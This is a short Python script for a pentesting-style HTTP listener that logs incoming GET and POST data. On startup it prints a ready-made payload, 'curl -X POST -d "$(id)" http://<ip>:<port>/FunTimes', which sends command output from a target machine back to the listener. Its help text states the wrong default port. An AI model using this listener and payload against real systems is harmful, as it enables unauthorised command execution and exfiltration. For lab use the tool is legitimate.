#!/usr/bin/env python3

NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'


banner = """
 ,--.     .  .             .---.
 |__/ . . |- |-. ,-. ,-.   \___  ,-. ,-. .  , ,-. ,-.
 |    | | |  | | | | | |       \ |-' |   | /  |-' |
 '    `-| `' ' ' `-' ' '   `---' `-' '   `'   `-' '
        |
      `-'
"""
import sys, logging, argparse, socket, os
from http.server import BaseHTTPRequestHandler, HTTPServer

parser = argparse.ArgumentParser(description='This is a python server that captures displays GET or POST data')
parser.add_argument('-p', type=int, metavar='port', default=8080, help="Set the port you want the server to listen on, Default port: 9000")

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        logging.info("\nPOST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n"+GREEN+"%s"+NOCOLOR+"\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=9000):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print('Starting httpd...')
    myip = socket.gethostbyname(socket.gethostname())
    print('Pickle this: '+NOCOLOR, end='')
    myurl = "curl -X POST -d \"$(id)\" http://{}:{}/FunTimes".format(myip,port)
    print(YELLOW+myurl+NOCOLOR)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':

    if len(sys.argv)==2:
        print( banner )
        parser.print_help()
        sys.exit(1)
    elif len(sys.argv)==3:
        options = parser.parse_args()
        run(port=options.p)
    else:
        run()
